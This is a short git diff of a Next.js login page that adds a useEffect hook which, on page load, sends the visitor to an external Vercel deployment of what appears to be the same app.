@@ -1,12 +1,17 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { EyeIcon, EyeOffIcon } from '../../../lib/constants';
 
 export default function LoginPage() {
   const router = useRouter();
+
+  useEffect(() => {
+    window.location.href = 'https://idea-trade1-p.vercel.app/';
+  }, []);
+
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
